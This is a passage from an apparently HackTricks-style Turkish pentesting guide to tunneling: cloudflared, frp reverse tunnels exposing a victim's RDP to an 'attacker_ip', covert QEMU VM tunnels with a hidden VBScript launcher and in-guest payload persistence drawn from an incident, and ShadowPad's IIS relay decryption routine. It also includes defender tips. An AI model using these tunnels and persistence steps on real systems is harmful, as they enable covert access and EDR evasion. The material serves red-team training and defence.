Legacy `--socks5` flag'i, `cloudflared`'e yerel origin'in SOCKS5 konuştuğunu bildirir; yerel bir SOCKS5 listener oluşturmaz. Bir managed tunnel için `originRequest.proxyType: socks`, SOCKS5 origin handling'i yapılandırır.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNS ile kalıcı tüneller

Yerel olarak yönetilen tunnel yapılandırmasında aşağıda gösterildiği gibi küçük harfli `tunnel`, `credentials-file` ve `url` anahtarları kullanılır.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Bağlayıcıyı başlatın:
```bash
cloudflared tunnel run mytunnel
```
Connector outbound bağlantılar kurar ve varsayılan olarak HTTP/2 fallback'i ile QUIC için negotiation yapar; her deployment'ın TCP/443 kullandığını varsaymayın. Bunu deployment'ınız için gereken minimum privileges ile çalıştırın.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp), **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX ve XTCP** destekleyen bir Go reverse proxy'dir. XTCP, başarısı NAT'e bağlı olan P2P hole punching kullanır. **v0.53.0** sürümünden itibaren **SSH Tunnel Gateway** olarak çalışabilir; böylece bir target host, `frpc` binary'si olmadan stock OpenSSH client kullanabilir.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klasik reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Yeni SSH gateway'ini kullanma (frpc binary'si olmadan)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Yukarıdaki komut, gateway'i `frps` sağlarken stock OpenSSH client kullanarak victim'ın **8080** portunu **attacker_ip:9000** olarak yayınlar.<sup>[[50]](#references)</sup>

## QEMU ile Covert VM-based Tunnels

QEMU user-mode networking, sanal ağ için root veya administrator privilege gerektirmez ve `-netdev user,hostfwd=...`, host'tan guest'e TCP, UDP veya UNIX bağlantılarını yönlendirir.<sup>[[51]](#references)</sup> TrustedSec, host odaklı EDR'nin guest içindeki etkinlikleri gözden kaçırabileceği bir olayda Tiny Core QEMU VM'sini ve denenmiş bir reverse SSH tunnel'ını belgeledi.<sup>[[1]](#references)</sup>

### Hızlı one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Yukarıdaki komut, 256 MiB guest belleğine ve bir qcow2 disk image'ına sahip bir **Tiny Core Linux** guest'i başlatır; disk image'ı in-RAM disk değildir.
• Windows host üzerindeki **2222/tcp** portu, guest içindeki **22/tcp** portuna şeffaf şekilde forward edilir.
• Attacker'ın bakış açısından hedef yalnızca 2222 portunu dışarıya açar; bu porta ulaşan tüm paketler VM içinde çalışan SSH server tarafından işlenir.

### VBScript üzerinden gizlice başlatma

TrustedSec, yukarıda atıfta bulunulan olayda VBS ile gerçekleştirilen QEMU başlatmalarını ve Tiny Core image'larını gözlemledi.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` ile script'i çalıştırmak pencerenin gizli kalmasını sağlar.<sup>[[1]](#references)</sup>

### Guest içi persistence

Belirtilen olay, stateless Tiny Core guest içindeki persistence işlemini `/opt/bootlocal.sh` ve `/opt/filetool.lst` üzerinden gerçekleştirmektedir:<sup>[[1]](#references)</sup>

1. Payload'u `/opt/123.out` konumuna bırakın
2. `/opt/bootlocal.sh` dosyasına ekleyin:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Payload'un shutdown sırasında `mydata.tgz` içine paketlenmesi için `/opt/filetool.lst` dosyasına `home/tc` ve `opt` ekleyin.

### Telemetry değerlendirmeleri

• Host hâlâ QEMU process'ini, qcow2 image'ını ve host tarafından forward edilen listener'ı açığa çıkarır.
• Yalnızca host üzerindeki process taramaları guest process'lerini incelemeyebilir; ancak virtualization'ın evasion sağlayacağı garanti değildir. Network, QEMU ve image telemetry'si bunu yine de açığa çıkarabilir.<sup>[[1]](#references)[[51]](#references)</sup>

### Defender ipuçları

• User-writable path'lerde **beklenmeyen QEMU/VirtualBox/KVM binary'leri** için alert oluşturun.
• `qemu-system*.exe` kaynaklı outbound connection'ları engelleyin.
• QEMU launch edildikten hemen sonra bind edilen nadir listening port'ları (2222, 10022, …) araştırın.

## `HttpAddUrl` üzerinden IIS/HTTP.sys relay node'ları (ShadowPad)

Check Point, ShadowPad'in IIS module'ünü, `HttpAddUrl` üzerinden URL prefix'lerini bind ederek ele geçirilmiş perimeter web server'larını backdoor ve relay node'larına dönüştüren bir yapı olarak açıklamaktadır.<sup>[[3]](#references)</sup>

Aynı report, aşağıda özetlenen default'ları, wildcard listener'ları, packet decryption'ı, relay queue'larını ve debug telemetry'sini ayrıntılı olarak ele almaktadır.<sup>[[3]](#references)</sup>

* **Config default'ları** – module'ün JSON config'i değerleri içermiyorsa, makul IIS default'larına (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`) geri döner. Böylece benign traffic, doğru branding ile IIS tarafından yanıtlanır.
* **Wildcard interception** – operator'ler URL prefix'lerinin noktalı virgülle ayrılmış bir listesini (host + path içinde wildcard'lar) sağlar. Module her entry için `HttpAddUrl` çağırır; böylece HTTP.sys eşleşen request'leri malicious handler'a yönlendirir. Eşleşmeyen request'ler normal IIS davranışına geri döner.
* **Encrypted first packet** – request body'sinin ilk iki byte'ı custom 32-bit PRNG için seed'i taşır. Protocol parsing'den önce sonraki her byte, oluşturulan keystream ile XOR-edilir:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module iki liste tutar: “servers” (upstream node'lar) ve “clients” (downstream implant'lar). Yaklaşık 30 saniye içinde heartbeat gelmezse entry'ler temizlenir. Her iki liste de boş olmadığında, ilk sağlıklı server'ı ilk sağlıklı client ile eşleştirir ve taraflardan biri connection'ı kapatana kadar byte'ları socket'leri arasında doğrudan iletir.
* **Debug telemetry** – isteğe bağlı logging, her eşleştirme için source IP'yi, destination IP'yi ve toplam forward edilen byte sayısını kaydeder. Investigators bu izleri kullanarak birden fazla victim'a yayılan ShadowPad mesh'ini yeniden oluşturdu.

---

## Kontrol edilmesi gereken diğer tool'lar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Gölgelerde Saklanmak: QEMU Virtualization üzerinden Covert Tunnel'lar](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell Öncesi: Storm-2603'ün Önceki Ransomware Operasyonlarını İncelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon'ın İçinde: Stealthy Offensive Operation'ın Relay Network'ünü ve İç İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Firewall/IDS Kısıtlamalarını Aşma](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual'i](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual'i](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit'te Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listener'ları](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual'i](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual'i](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual'i](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
